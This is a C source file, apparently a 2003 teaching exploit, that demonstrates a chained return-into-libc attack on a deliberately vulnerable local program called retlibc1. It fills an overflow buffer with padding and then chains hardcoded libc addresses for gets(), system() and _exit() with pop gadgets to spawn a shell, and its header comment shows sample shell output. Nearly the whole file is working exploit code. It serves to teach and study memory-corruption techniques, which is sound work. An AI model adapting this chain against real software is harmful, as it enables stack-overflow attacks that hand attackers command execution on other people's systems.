/*
 * $Id: retlibc1-ex8.c,v 1.1.1.1 2004/05/29 14:15:05 raptor Exp $
 *
 * retlibc1-ex8.c - retlibc1.c exploit (return-into-libc)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This exploit shows the chained return-into-libc technique, changing the
 * execution flow of an abo1.c-like vulnerable program. That's the advanced
 * version of the previous retlibc1-ex7.c.
 *
 * $ gcc retlibc1-ex8.c -o retlibc1-ex8 -lc -ldl
 * $ ./retlibc1-ex8 
 * Using gets() address: 0x4007c380
 * Using system() address: 0x4005f590
 * Using _exit() address: 0x400bae90
 * id
 * uid=3008(raptor) gid=1000(redazione) groups=1000(redazione)
 * $
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <dlfcn.h>

#define BUF	293			// (65 * 4) + (4 * 8) + 1
#define	VULN	"./retlibc1"		// the vulnerable program

#define LIBBASE	0x4001a000		// base address of libc mapping
#define	POP1	(LIBBASE + 0xd2ba4)	// pop 1 argument from the stack
#define	POP2	(LIBBASE + 0xd2ba3)	// pop 2 arguments from the stack
#define	POP3	(LIBBASE + 0xd2ba2)	// pop 3 arguments from the stack
#define	POP4	(LIBBASE + 0xd2ba1)	// pop 4 arguments from the stack
#define	STACK	0xbffffbbc		// vuln buf address on the stack

int search(char *pattern) /* search for a symbol in libc */
{
	void *p;
	int addr;

	/* dlopen() the main program */
	if ( !(p = dlopen(NULL, RTLD_LAZY)) ) {
		fprintf(stderr, "%s\n", dlerror());
		exit(-1);
	}

	/* search for the pattern */
	if ( !(addr = (int)dlsym(p, pattern)) ) {
		fprintf(stderr, "%s\n", dlerror());
		exit(-1);
	}

	/* check the address for the presence of a 0x0 */
	if ( !(addr & 0xff) || !(addr & 0xff00) || !(addr & 0xff0000) ||
			!(addr & 0xff000000) ) {
		fprintf(stderr, "the address of %s contains a 0x0!\n", pattern);
		exit(-1);
	}

	dlclose(p);
	return(addr);
}

int main()
{
	char buf[BUF];
	int *p = (int *)buf;

	int gets = search("gets");
	int system = search("system");
	int exit = search("_exit"); /* can't use exit() */

	fprintf(stderr, "Using gets() address: %p\n", gets);
	fprintf(stderr, "Using system() address: %p\n", system);
	fprintf(stderr, "Using _exit() address: %p\n", exit);

	/* fill the first part of the buffer */
	memset(buf, 'A', BUF);
	p += 65;

	/* prepare the stack */
	*p++ = gets;	/* gets() address in libc */
	*p++ = POP1;	/* pop 1 argument */
	*p++ = STACK;	/* gets() argument */
	*p++ = system;	/* system() address in libc */
	*p++ = POP1;	/* pop 1 argument */
	*p++ = STACK;	/* system() argument */
	*p++ = exit;	/* _exit() address in libc */
	*p++ = STACK;	/* dummy address */
	*p = 0x0;

	/* run the vulnerable program */
	execl(VULN, VULN + 2, buf, NULL);
	perror("execl");
}
